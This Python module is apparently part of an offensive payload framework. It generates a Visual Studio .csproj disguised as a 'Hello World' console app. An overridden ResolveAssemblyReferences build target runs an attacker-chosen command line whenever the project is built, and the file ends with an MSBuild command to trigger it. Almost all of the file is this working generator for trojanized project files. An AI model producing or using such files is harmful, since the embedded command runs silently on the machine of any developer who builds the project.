#!/usr/bin/env python
# encoding: utf-8

import logging, os
from modules.payload_builder import PayloadBuilder
from collections import OrderedDict



CSPROJ_TEMPLATE = \
r"""<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{C33A0993-A331-406C-83F5-9357DF239B30}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>ConsoleAppNet</RootNamespace>
    <AssemblyName>ConsoleAppNet</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Hello.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  
  <<<TARGET>>>
  
</Project>
"""


CSPROJ_TARGET_TEMPLATE = \
r"""
  <Target Name="ResolveAssemblyReferences">
    <Exec Command="<<<CMDLINE>>>" />  
  </Target>
"""


APP_CONFIG_TEMPLATE = \
r"""
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
    </startup>
</configuration>

"""


HELLO_CS_TEMPLATE = \
r"""

using System;

namespace ConsoleAppNet
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");
        }
    }
}


"""



# mshta.exe $(MSBuildProjectDirectory)\$(MSBuildProjectName).csproj

class CsProjGenerator(PayloadBuilder):
    """
    Generates malicious Visual Studio Project files
    """
    
        
    def check(self):
        
        if not self.mpSession.htaMacro:
            paramDict = OrderedDict([("Command line",None)])      
            self.fillInputParams(paramDict)
            self.mpSession.dosCommand = paramDict["Command line"]
            
            
        return True
        
        
    def generate(self):
        logging.info(" [+] Generating %s file..." % self.outputFileType)
        
        outputFolderPath = os.path.dirname(self.outputFilePath)
        appConfigName = os.path.join(outputFolderPath,"App.config")
        csprojName = self.outputFilePath
        csName = os.path.join(outputFolderPath,"Hello.cs")
        
        logging.info("   [-] Generating csproj file...")
        csprojContent = CSPROJ_TEMPLATE
        self.mpSession.dosCommand = self.mpSession.dosCommand.replace("&", "&amp;") # & is invalid char in XML
        csprojContent = csprojContent.replace("<<<TARGET>>>",CSPROJ_TARGET_TEMPLATE)
        csprojContent = csprojContent.replace("<<<CMDLINE>>>",self.mpSession.dosCommand)
        f = open(csprojName, 'w')
        f.write(csprojContent)
        f.close()
        
        logging.info("   [-] Add config file...")
        f = open(appConfigName, 'w')
        f.write(APP_CONFIG_TEMPLATE)
        f.close()
        
        logging.info("   [-] Add cs file...")
        f = open(csName, 'w')
        f.write(HELLO_CS_TEMPLATE)
        f.close()
        
        logging.info("   [-] Generated %s file: %s" % (self.outputFileType, self.outputFilePath))
        logging.info(r"   [-] Test with : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe /nologo /noconsolelogger %s " % self.outputFilePath)
       
    

